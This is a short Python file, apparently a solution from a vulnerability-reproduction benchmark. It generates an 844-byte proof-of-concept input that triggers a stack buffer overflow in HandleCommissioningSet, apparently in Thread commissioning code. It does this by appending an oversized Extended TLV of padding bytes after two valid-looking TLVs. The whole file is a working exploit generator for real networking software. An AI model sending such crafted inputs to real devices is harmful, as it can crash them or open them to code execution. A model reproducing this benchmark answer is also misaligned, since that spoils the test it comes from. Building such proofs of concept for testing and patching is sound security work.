import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow in HandleCommissioningSet.
        The vulnerability is caused by improper rejection of Extended TLVs in the Commissioner Dataset,
        leading to a stack overflow when copying the TLV value.
        """
        # Ground truth length is 844 bytes.
        target_length = 844

        # Construct initial valid TLVs to pass potential checks (e.g. Session ID, Border Agent Locator)
        # TLV 1: Commissioner Session ID (Type 11), Length 2, Value 0x0000
        tlv_1 = struct.pack("BB", 11, 2) + b"\x00\x00"

        # TLV 2: Border Agent Locator (Type 9), Length 2, Value 0x0000
        tlv_2 = struct.pack("BB", 9, 2) + b"\x00\x00"

        # Calculate remaining space for the overflow TLV
        # Overhead so far: 4 + 4 = 8 bytes
        # Overflow TLV Header overhead: 1 (Type) + 1 (Len=0xFF) + 2 (ExtLen) = 4 bytes
        # Total overhead = 12 bytes
        payload_len = target_length - len(tlv_1) - len(tlv_2) - 4

        # TLV 3: Steering Data (Type 8) using Extended TLV format
        # Type 8 is typically variable length and processed in HandleCommissioningSet.
        # Format: Type | 0xFF | ExtendedLength (Big Endian uint16) | Value
        tlv_type = 8
        tlv_len_marker = 0xFF
        
        header = struct.pack("BB", tlv_type, tlv_len_marker) + struct.pack(">H", payload_len)
        body = b"A" * payload_len
        
        tlv_3 = header + body

        return tlv_1 + tlv_2 + tlv_3
